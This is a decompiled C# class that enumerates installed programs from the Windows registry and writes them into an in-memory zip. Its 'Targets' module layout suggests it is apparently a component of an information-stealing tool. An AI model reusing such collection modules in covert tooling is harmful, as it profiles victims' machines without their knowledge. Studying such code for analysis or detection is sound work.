using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Device
{
	// Token: 0x0200002F RID: 47
	public class InstalledPrograms : ITarget
	{
		// Token: 0x06000086 RID: 134 RVA: 0x00006730 File Offset: 0x00004930
		public void Collect(InMemoryZip zip, Counter counter)
		{
			List<InstalledPrograms.InstalledProgram> list = new string[]
			{
				"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
				"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
			}.SelectMany((string key) => InstalledPrograms.GetInstalledPrograms(key, Registry.LocalMachine, counter).Concat(InstalledPrograms.GetInstalledPrograms(key, Registry.CurrentUser, counter))).ToList<InstalledPrograms.InstalledProgram>();
			bool flag = list.Count != 0;
			if (flag)
			{
				int maxName = Math.Max("Name".Length, list.Max(delegate(InstalledPrograms.InstalledProgram p)
				{
					string name = p.Name;
					return (name != null) ? name.Length : 0;
				}));
				int maxVersion = Math.Max("Version".Length, list.Max(delegate(InstalledPrograms.InstalledProgram p)
				{
					string version = p.Version;
					return (version != null) ? version.Length : 0;
				}));
				int maxPath = Math.Max("Path".Length, list.Max(delegate(InstalledPrograms.InstalledProgram p)
				{
					string installLocation = p.InstallLocation;
					return (installLocation != null) ? installLocation.Length : 0;
				}));
				List<string> list2 = new List<string>
				{
					string.Concat(new string[]
					{
						"Name".PadRight(maxName),
						" | ",
						"Path".PadRight(maxPath),
						" | ",
						"Version".PadRight(maxVersion)
					}),
					new string('-', maxName + maxPath + maxVersion + 6)
				};
				list2.AddRange(from p in list
				select string.Concat(new string[]
				{
					(p.Name ?? "Unknown").PadRight(maxName),
					" | ",
					(p.InstallLocation ?? "Unknown").PadRight(maxPath),
					" | ",
					(p.Version ?? "Unknown").PadRight(maxVersion)
				}));
				zip.AddTextFile("InstalledPrograms.txt", string.Join("\n", list2));
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x000068FC File Offset: 0x00004AFC
		private static List<InstalledPrograms.InstalledProgram> GetInstalledPrograms(string uninstallKey, RegistryKey root, Counter counter)
		{
			ConcurrentBag<InstalledPrograms.InstalledProgram> installedPrograms = new ConcurrentBag<InstalledPrograms.InstalledProgram>();
			using (RegistryKey registryKey = root.OpenSubKey(uninstallKey))
			{
				bool flag = registryKey == null;
				if (flag)
				{
					return new List<InstalledPrograms.InstalledProgram>();
				}
				string[] subKeyNames = registryKey.GetSubKeyNames();
				bool flag2 = subKeyNames == null || subKeyNames.Length == 0;
				if (flag2)
				{
					return new List<InstalledPrograms.InstalledProgram>();
				}
				Parallel.ForEach<string>(subKeyNames, delegate(string subkeyName)
				{
					try
					{
						using (RegistryKey registryKey2 = root.OpenSubKey(uninstallKey + "\\" + subkeyName))
						{
							string text = ((registryKey2 != null) ? registryKey2.GetValue("DisplayName") : null) as string;
							bool flag3 = !string.IsNullOrEmpty(text);
							if (flag3)
							{
								InstalledPrograms.InstalledProgram item = new InstalledPrograms.InstalledProgram
								{
									Name = text.Trim(),
									Version = ((registryKey2.GetValue("DisplayVersion") as string) ?? "Unknown"),
									InstallLocation = ((registryKey2.GetValue("InstallLocation") as string) ?? "Unknown")
								};
								installedPrograms.Add(item);
							}
						}
					}
					catch
					{
					}
				});
			}
			return installedPrograms.ToList<InstalledPrograms.InstalledProgram>();
		}

		// Token: 0x020000A0 RID: 160
		private class InstalledProgram
		{
			// Token: 0x17000021 RID: 33
			// (get) Token: 0x0600026E RID: 622 RVA: 0x0001C2E3 File Offset: 0x0001A4E3
			// (set) Token: 0x0600026F RID: 623 RVA: 0x0001C2EB File Offset: 0x0001A4EB
			public string Name { get; set; }

			// Token: 0x17000022 RID: 34
			// (get) Token: 0x06000270 RID: 624 RVA: 0x0001C2F4 File Offset: 0x0001A4F4
			// (set) Token: 0x06000271 RID: 625 RVA: 0x0001C2FC File Offset: 0x0001A4FC
			public string Version { get; set; }

			// Token: 0x17000023 RID: 35
			// (get) Token: 0x06000272 RID: 626 RVA: 0x0001C305 File Offset: 0x0001A505
			// (set) Token: 0x06000273 RID: 627 RVA: 0x0001C30D File Offset: 0x0001A50D
			public string InstallLocation { get; set; }
		}
	}
}
